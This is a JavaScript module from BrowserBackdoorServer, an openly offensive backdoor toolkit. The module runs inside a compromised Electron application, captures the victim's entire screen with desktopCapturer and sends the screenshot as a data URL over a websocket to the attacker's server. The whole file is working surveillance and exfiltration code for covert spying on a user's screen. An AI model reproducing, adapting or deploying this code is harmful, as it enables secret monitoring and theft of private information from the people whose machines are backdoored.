/*
 * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Parameters: None
 * Returns: Data URL of screenshot
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');
if (typeof desktopCapturer == 'undefined') desktopCapturer = electron.desktopCapturer;
if (typeof electronScreen == 'undefined') electronScreen = electron.screen;
if (typeof shell == 'undefined') shell = electron.shell;

if (typeof fs == 'undefined') fs = require('fs');
if (typeof os == 'undefined') os = require('os');
if (typeof path == 'undefined') path = require('path');


if (typeof thumbSize == 'undefined') thumbSize = determineScreenShotSize();
if (typeof options == 'undefined') options = { types: ['screen'], thumbnailSize: thumbSize };

desktopCapturer.getSources(options, function (error, sources) {
    if (error) return console.error(error)

    sources.forEach(function (source) {
        if (source.name === 'Entire screen' || source.name === 'Screen 1') {
            ws.send("Screenshot data URL: " + source.thumbnail.toDataURL())
        }
    })
})

function determineScreenShotSize() {
  screenSize = electronScreen.getPrimaryDisplay().workAreaSize
  maxDimension = Math.max(screenSize.width, screenSize.height)
  return {
    width: maxDimension * window.devicePixelRatio,
    height: maxDimension * window.devicePixelRatio
  }
}
